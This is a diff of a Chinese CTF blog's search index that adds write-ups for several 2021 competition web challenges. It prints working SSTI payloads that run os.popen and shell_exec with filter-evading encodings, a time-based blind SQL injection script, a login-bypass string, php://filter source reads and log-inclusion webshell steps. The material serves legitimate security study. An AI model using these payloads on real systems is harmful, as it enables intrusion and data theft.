@@ -4,6 +4,101 @@
   
   
   <entry>
+    <title>Newctf</title>
+    <link href="/2021/06/02/newctf/"/>
+    <url>/2021/06/02/newctf/</url>
+    
+    <content type="html"><![CDATA[<h2 id="2021-6-1萌新赛-easy-web"><a href="#2021-6-1萌新赛-easy-web" class="headerlink" title="2021.6.1萌新赛-easy_web"></a>2021.6.1萌新赛-easy_web</h2><p>hint:这个图片真好看呀，没啥隐藏的东西吧    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/a108d4199c1e415b.png">       </p><p>第一点：<code>md5($six_number) == &#39;e10adc3949ba59abbe56e057f20f883e&#39;</code><br>这一串是123456的MD5       </p><p>第二点：<code>===</code>可以数组绕过        </p><p>第三点：<code>$array[++$c]=1</code>数组索引溢出，<code>$c=9223372036854775806</code>      </p><p>payload:<code>webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806</code>     </p><p>返回：   </p><pre><code>你觉得就这么简单吗？？？，可以告诉你密码哦！        password: xluoyyds123456@@@      </code></pre><p>然后是一个图片隐写，下载下来背景图片，后缀改为<code>.rar</code>       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/8c299e4b1ca8b594.png">         </p><p>输入密码得到flag    </p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>php</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>WP</tag>
+      
+      <tag>php</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>NEEPUCTF</title>
+    <link href="/2021/05/27/NEEPUCTF/"/>
+    <url>/2021/05/27/NEEPUCTF/</url>
+    
+    <content type="html"><![CDATA[<h2 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h2><p>打开环境    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/b36aac21b99441e6.png"></p><p>就在这里，我居然没找到，太失败了   </p><h2 id="The-myth-of-Aladdin"><a href="#The-myth-of-Aladdin" class="headerlink" title="The_myth_of_Aladdin"></a>The_myth_of_Aladdin</h2><p>SSTI<br>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%print()%&#125;</code>替代<br><code>.</code>用<code>[]</code>替换<br>过滤了类名，八进制或者Unicode均可绕过     </p><p>payload：<code>&#123;%print(().__class__.__base__.__subclass__()[95].__init__.__globals__.__builtins__.__import__('os').popen('ls').read())%&#125;</code>   </p><p>转八进制     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$str=<span class="hljs-string">&#x27;read&#x27;</span>;$res=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($str);$i++)&#123;    $res.=<span class="hljs-string">&quot;\\&quot;</span>.decoct(ord($str[$i]));&#125;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;\n&quot;</span>;var_dump($res);</code></pre></code></pre><p>en-payload:<code>&#123;%print(()["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[95]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]["\137\137\151\155\160\157\162\164\137\137"]("o""s")["\160\157\160\145\156"]("ls")["\162\145\141\144"]())%&#125;</code>     </p><p>空格用<code>%09</code>代替     </p><p>最后读取flag过滤了<code>Neepu</code>，Unicode编码<br><code>cat /flag|base64</code>—&gt;<code>\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u007c\u0062\u0061\u0073\u0065\u0036\u0034</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/36675dab86b84736.png">    </p><p>WP是使用截断的方法读取flag的<br><code>&quot;c&quot;&quot;ut%09-c%092-40%09/fl&quot;&quot;ag&quot;</code><br>cut<br> <code>-c</code>:仅显示行中指定范围的字符；     </p><h2 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h2><p>打开环境是个登录框，万能密码即可登录<code>adwa&#39;=&#39;0</code><br>进入后是个小游戏<br><img src="https://ftp.bmp.ovh/imgs/2021/05/00e8b9a1dd156058.png">     </p><p>验证码图片的名字就是验证码，可以写脚本跑    </p><p>猜对五次后会进行跳转<br><code>http://neepusec.club:18943/index.php?file=rander.php</code>       </p><p>可以用为协议读取下源码<br><code>?file=php://filter/read=convert.base64-encode/resource=rander.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// create object</span><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;num&#x27;</span>] &gt;= <span class="hljs-number">5</span>) &#123;    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;smarty/Smarty.class.php&#x27;</span>);    $smarty = <span class="hljs-keyword">new</span> Smarty;    $name = $_SESSION[<span class="hljs-string">&quot;username&quot;</span>];    $smarty-&gt;display(<span class="hljs-string">&#x27;string:恭喜 &#x27;</span>.$name.<span class="hljs-string">&#x27; 获得了胜利&#x27;</span>);&#125;</code></pre></code></pre><p><code>display</code>存在PHP模板注入     </p><p>名字改成模板注入语句即可<br>这里还有<code>disable_function</code>,可以用<code>shell_exec</code>    </p><p>WP的EXP：        </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requestsurl=<span class="hljs-string">&quot;http://neepusec.club:18943&quot;</span>s = requests.Session()<span class="hljs-comment">#payload = &quot;&#123;&#123;shell_exec(\&quot;\ls\t/\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>payload = <span class="hljs-string">&quot;&#123;&#123;shell_exec(\&quot;cat\t/This_is_your_Flag\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>login_data = &#123;<span class="hljs-string">&quot;username&quot;</span>:payload&#125;res0 = s.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,data = login_data)res1 = s.get(url+<span class="hljs-string">&quot;/index.php&quot;</span>)reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res1.text)data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1000</span>):    res3 = s.post(url+<span class="hljs-string">&quot;/index.php&quot;</span>,data=data)    reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res3.text)    data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(res3.text)!=<span class="hljs-number">3287</span>):        print(i)        print(res3.text)        <span class="hljs-keyword">break</span></code></pre></code></pre><p>另一种方法<a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">（日志包含）</a>：<br>日志路径<code>file=/var/log/nginx/access.log</code><br><img src="https://ftp.bmp.ovh/imgs/2021/05/4ad56cf981691d27.png">       </p><p>写入一句话<br><img src="https://ftp.bmp.ovh/imgs/2021/05/81e22ec2143d5c2f.png"></p><p><a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">more</a>     </p><p><a href="https://www.cnblogs.com/my1e3/p/5854897.html">日志包含</a>     </p><hr><p><a href="https://www.anquanke.com/post/id/242237#h3-2">最后两题</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>php</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>WP</tag>
+      
+      <tag>php</tag>
+      
+      <tag>upload</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>MTCTF CSICN</title>
+    <link href="/2021/05/25/MTCISCN/"/>
+    <url>/2021/05/25/MTCISCN/</url>
+    
+    <content type="html"><![CDATA[<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>MT的第一题，时间盲注，但是常见的字符都过了<code>ascii</code>、<code>substr</code>,大于号小于号等于号，<code>lile</code>,<code>if</code>都过了，不会了   </p><p><code>W&amp;M</code> 的WP   </p><pre><code><pre><code class="hljs python">    <span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ord2hex</span>(<span class="hljs-params">string</span>):</span>    result = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))    result = result.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+result    url = <span class="hljs-string">&quot;http://eci-2ze7bgvjvxtgmki6mtcj.cloudeci1.ichunqiu.com/index.php&quot;</span>    string = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>]    headers = &#123;        <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#x27;</span>,        <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,        <span class="hljs-string">&#x27;Connection&#x27;</span>:<span class="hljs-string">&#x27;keep-alive&#x27;</span>        &#125;    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:        passwd = ord2hex(<span class="hljs-string">&#x27;^&#x27;</span>+res+<span class="hljs-built_in">chr</span>(j))        <span class="hljs-comment">#print(passwd)</span>        passwd = <span class="hljs-string">&#x27;||case/**/when/**/password/**/regexp/**/binary/**/&#123;&#125;/**/then/**/sleep(3)/**/else/**/1111111/**/end/**/#&#x27;</span>.<span class="hljs-built_in">format</span>(passwd)        <span class="hljs-comment">#print(passwd)</span>        data = &#123;        <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&quot;admin\\&quot;</span>,        <span class="hljs-string">&#x27;password&#x27;</span>:passwd        &#125;        before_time = time.time()        r = req.post(url, data=data, headers=headers)        after_time = time.time()        <span class="hljs-comment">#print( r.text)</span>        offset = after_time - before_time        <span class="hljs-comment"># print(offset)</span>        <span class="hljs-keyword">if</span> (offset &gt; <span class="hljs-number">2</span>):        print(passwd)        res += <span class="hljs-built_in">chr</span>(j)        print(res)        <span class="hljs-keyword">break</span>    <span class="hljs-comment">#password This_1s_thE_Passw0rd</span>    ```    `case when`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">27e74714170</span>e20bb.png)    `regexp`正则匹配     这个匹配可以直接匹配到字符的十六进制，Mysql会将十六进制转换      ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">69215</span>b03e678fd6b.png)        <span class="hljs-comment">## easytricks </span>MT      也有SQL注入的点   ` select * <span class="hljs-keyword">from</span> user where user=<span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> passwd=<span class="hljs-string">&#x27;%s&#x27;</span>`    %s----&gt;字符串      [sprintf格式化注入漏洞](https://blog.csdn.net/weixin_41185953/article/details/<span class="hljs-number">80485075</span>)     `没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%<span class="hljs-number">1</span>$\）被替换为空`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">7</span>b7afea854b5deba.png)     可以看到`%<span class="hljs-number">1</span>$`后的`<span class="hljs-string">&#x27;`被吞了      </span><span class="hljs-string"></span><span class="hljs-string">[MTCTF-2021 Write_Up by 打CTF不靠实力靠运气](https://mp.weixin.qq.com/s/zP7pOdL0zbWzKMJlVcff-Q)     </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">##  easy_source   </span><span class="hljs-string">CISCN   </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">`.index.php.swo`    </span><span class="hljs-string"></span><span class="hljs-string">    ```php</span><span class="hljs-string">    &lt;?php</span><span class="hljs-string">    class User</span><span class="hljs-string">    &#123;</span><span class="hljs-string">        private static $c = 0;</span><span class="hljs-string"></span><span class="hljs-string">        function a()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function b()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function c()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function d()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function e()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function f()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function g()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function h()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function i()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function j()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function k()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function l()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function m()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function n()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function o()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function p()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function q()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function r()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function s()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function t()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string">        </span><span class="hljs-string">    &#125;</span><span class="hljs-string"></span><span class="hljs-string">    $rc=$_GET[&quot;rc&quot;];</span><span class="hljs-string">    $rb=$_GET[&quot;rb&quot;];</span><span class="hljs-string">    $ra=$_GET[&quot;ra&quot;];</span><span class="hljs-string">    $rd=$_GET[&quot;rd&quot;];</span><span class="hljs-string">    $method= new $rc($ra, $rb);</span><span class="hljs-string">    var_dump($method-&gt;$rd());</span></code></pre></code></pre><p>利用PHP原生类读取类中的注释<br><code>ReflectionMethod</code>  </p><p><code>public ReflectionMethod::__construct ( mixed $class , string $name )</code><br>–&gt;$class类的名称      </p><p>–&gt;$name方法的名称         </p><p>或者<code>public ReflectionMethod::__construct ( string $class_method )</code>      </p><p>$class_method–&gt;类的名称和方法的名称中间以<code>::</code>分割      </p><p>ReflectionMethod中的<code>getDocComment</code>可以返回注释 代码     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e78bf4d72e174c59.png">     </p><p>payload:<code>rc=ReflectionMethond&amp;ra=User&amp;rb=q&amp;rd=getDocComment</code>      </p><p>ReflectionMethod里的其他方法    </p><pre><code>```php$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回nullvar_dump($ref-&gt;inNamespace()); // 是否在命名空间中var_dump($ref-&gt;getConstants()); // 获取所有定义的常量var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回falsevar_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间var_dump($ref-&gt;getStartLine()); // 获取起始行号print_r($ref-&gt;getStaticProperties()); // 获取静态属性print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // 检查方法是否已经定义var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制var_dump($ref-&gt;isFinal()); // 检查类是否声明为 finalvar_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化var_dump($ref-&gt;isInterface()); // 检查类是否是一个接口（interface）var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类var_dump($ref-&gt;isTrait()); // 返回了是否为一个 traitvar_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。var_dump($ref-&gt;newInstance());// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。//这个参数以 array 形式传递到类的构造函数。var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。​```</code></pre><p><a href="http://www.xl-bit.cn/index.php/archives/434/">Bit’s Blog —-CISCN2021—初赛—WP（及部分解题思路）</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>sql</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>WP</tag>
+      
+      <tag>sql</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Avatar Uploader 1</title>
     <link href="/2021/05/24/BUU88/"/>
     <url>/2021/05/24/BUU88/</url>
@@ -94,9 +189,9 @@
       
       <tag>php</tag>
       
-      <tag>getshell</tag>
-      
       <tag>upload</tag>
+      
+      <tag>getshell</tag>
       
     </tags>
     
@@ -329,11 +424,11 @@
       
       <tag>CTF</tag>
       
-      <tag>WP</tag>
-      
       <tag>文件读取</tag>
       
       <tag>php://filter/string.strip_tags</tag>
+      
+      <tag>WP</tag>
       
     </tags>
     
@@ -362,11 +457,11 @@
       
       <tag>CTF</tag>
       
+      <tag>WP</tag>
+      
       <tag>unserialize</tag>
       
       <tag>char.escape</tag>
-      
-      <tag>WP</tag>
       
     </tags>
     
@@ -2422,17 +2517,6 @@
   
   
   <entry>
-    <title>404</title>
-    <link href="/"/>
-    <url>/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>About</title>
     <link href="/"/>
     <url>/</url>
@@ -2444,40 +2528,18 @@
   
   
   <entry>
+    <title>404</title>
+    <link href="/"/>
+    <url>/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Friends</title>
-    <link href="/"/>
-    <url>/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Html</title>
-    <link href="/"/>
-    <url>/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Categories</title>
-    <link href="/"/>
-    <url>/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Categories</title>
     <link href="/"/>
     <url>/</url>
     
@@ -2500,6 +2562,39 @@
   
   <entry>
     <title>分类</title>
+    <link href="/"/>
+    <url>/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Categories</title>
+    <link href="/"/>
+    <url>/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Categories</title>
+    <link href="/"/>
+    <url>/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Html</title>
     <link href="/"/>
     <url>/</url>
     
